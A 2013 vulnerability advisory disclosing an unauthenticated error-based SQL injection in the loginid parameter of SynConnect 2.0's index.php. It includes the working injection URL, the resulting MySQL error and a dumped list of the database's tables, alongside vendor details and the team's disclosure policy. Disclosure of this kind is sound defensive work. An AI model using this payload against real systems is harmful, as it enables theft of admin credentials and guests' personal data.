@@ -1,0 +1,228 @@
+Title:
+====
+
+SynConnect - SQL Injection vulnerability
+
+
+Credit:
+======
+
+Name: Bhadresh Patel
+Company/affiliation: Cyberoam Technologies Private Limited
+Website: www.cyberoam.com
+
+
+CVE:
+=====
+
+
+Date:
+====
+
+01-03-2013
+
+CRD:
+====
+
+CRD-2013-01
+
+Vendor:
+======
+
+Synchroweb Technology is a provider of application software, hardware and other innovative enterprise technology. They strive in development, deployment, and management of Linux and open source solutions for Internet infrastructure ranging from embedded devices to secure data center facilities throughout the Asia market.
+
+Product:
+=======
+
+SynConnect is a PMS (Property management software) product of Synchroweb which provides High Speed Internet Access to Hotels, Airport lounge, Resort, conference centers, universities, etc.
+
+Product link: http://www.synchroweb.com/prod_syn.php
+
+Abstract:
+=======
+
+Cyberoam Vulnerability Research Team discovered a SQL Injection Vulnerability on the SynConnect is a PMS software.
+Report-Timeline:
+============
+21-03-2013: Vendor notification
+00-00-2013: Vendor Response/Feedback
+00-00-2013: Vendor Fix/Patch
+00-00-2013: Public or Non-Public Disclosure
+
+
+Affected Version:
+=============
+
+Ver 2.0
+
+Exploitation-Technique:
+===================
+
+Remote
+
+Severity Rating:
+===================
+
+7.3 (AV:N/AC:L/Au:N/C:C/I:C/A:C/E:F/RL:U/RC:C/CDP:MH/TD:M/CR:H/IR:H/AR:H)
+
+Details:
+=======
+
+There is an error-based SQL injection vulnerability in SysConnect's index.php which allows attacker to steal full database including Master admin credentials and Guest's personal confidential information.
+
+Further, login to admin portal gives attacker an overall control of guest accounts. Attacker can impersonate his identity by stealing guest's login credential.
+
+SynConnect also offers easy payment internet access via prepaid packages or payment gateway from internet such as World Pay but, I have not checked vulnerability coverage in this area.
+
+Vulnerable Module(s):
+
+index.php?func=logoff&loginid=
+
+Vulnerable Parameter:
+
+loginid
+
+--------------SQL Error Logs------------
+
+Fatal error: SQL-statement failed: select * from user_master,group_master,package_master where user_master.userid='1011' AND (SELECT 8975 FROM(SELECT COUNT(*),CONCAT((SELECT MID((IFNULL(CAST(schema_name AS CHAR),0x20)),1,50) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 6,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'bhdresh'='bhdresh' and user_master.groupid=group_master.groupid and user_master.pkgid=package_master.pkgid
+MySQL said Duplicate entry 'synconnect1' for key 'group_key' (1062).
+
+----------------------------------------------
+
+Caveats / Prerequisites:
+======================
+
+No Prerequisites
+
+Proof Of Concept:
+================
+
+Vulnerability can be exploited by remote attacker without authentication. For demonstration or reproduce ...
+
+http://localhost/index.php?func=logoff&loginid=1011' AND (SELECT 8975 FROM(SELECT COUNT(*),CONCAT((SELECT MID((IFNULL(CAST(schema_name AS CHAR),0x20)),1,50) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 6,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'bhdresh'='bhdresh
+
+
+--- SQL Access Log ---
+
+http://localhost/index.php?func=logoff&loginid=1011' AND (SELECT 8975 FROM(SELECT COUNT(*),CONCAT((SELECT MID((IFNULL(CAST(schema_name AS CHAR),0x20)),1,50) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 6,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'bhdresh'='bhdresh
+
+Database synconnect1 has following list of tables,
+
+[43 tables]
+
++---------------------+
+
+| 1stlogin |
+
+| accesslevel_detail |
+
+| accesslevel_master |
+
+| admin_master |
+
+| adminlog |
+
+| bandwidth_master |
+
+| bandwidth_qos |
+
+| bandwidth_tc_master |
+
+| cms_users |
+
+| device_detail |
+
+| device_master |
+
+| dhcp |
+
+| fwblock |
+
+| group_master |
+
+| group_package |
+
+| group_useramr |
+
+| invoice_master |
+
+| last_date |
+
+| layer7_master |
+
+| mac_master |
+
+| module_detail |
+
+| module_master |
+
+| network |
+
+| nms |
+
+| nms_log |
+
+| package_check |
+
+| package_master |
+
+| pms_host |
+
+| pms_link_handshake |
+
+| pms_payment |
+
+| pms_vip |
+
+| ports |
+
+| prepaid_id |
+
+| protos |
+
+| proxy_master |
+
+| publicip_master |
+
+| qos_master |
+
+| sessions |
+
+| tracking_prepaid |
+
+| usage_master |
+
+| user_actavg |
+
+| user_browserinfo |
+
+| user_connect |
+
++-------------------
+
+
+Risk:
+=====
+
+The security risk of the remote sql injection vulnerability is estimated as critical.
+
+Creditee:
+=======
+
+Bhadresh Patel - Cyberoam Security Research Team
+
+Disclaimer:
+===========
+
+The information provided in this advisory is provided as it is without any warranty. Any modified copy or reproduction, including partially usages, of this file requires authorization from Cyberoam Vulnerability Research Team. Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by Cyberoam Vulnerability Research Team.
+
+
+The first attempt at contact will be through any appropriate contacts or formal mechanisms listed on the vendor Web site, or by sending an e-mail with the pertinent information about the vulnerability. Simultaneous with the vendor being notified, Cyberoam may distribute vulnerability protection filters to its customers' IPS devices through the IPS upgrades.
+
+If a vendor fails to respond after five business days, Cyberoam Vulnerability Research Team may issue a public advisory disclosing its findings fifteen business days after the initial contact.
+
+If a vendor response is received within the timeframe outlined above, Cyberoam Vulnerability Research Team will allow the vendor 6-months to address the vulnerability with a patch. At the end of the deadline if a vendor is not responsive or unable to provide a reasonable statement as to why the vulnerability is not fixed, the Cyberoam Vulnerability Research Team will publish a limited advisory to enable the defensive community to protect the user. We believe that by doing so the vendor will understand the responsibility they have to their customers and will react appropriately.
+
+Cyberoam Vulnerability Research Team will make every effort to work with vendors to ensure they understand the technical details and severity of a reported security flaw. If a product vendor is unable to, or chooses not to, patch a particular security flaw, Cyberoam Vulnerability Research Team will offer to work with that vendor to publicly disclose the flaw with some effective workarounds.
+
+Before public disclosure of a vulnerability, Cyberoam Vulnerability Research Team may share technical details of the vulnerability with other security vendors who are in a position to provide a protective response to a broader user base.
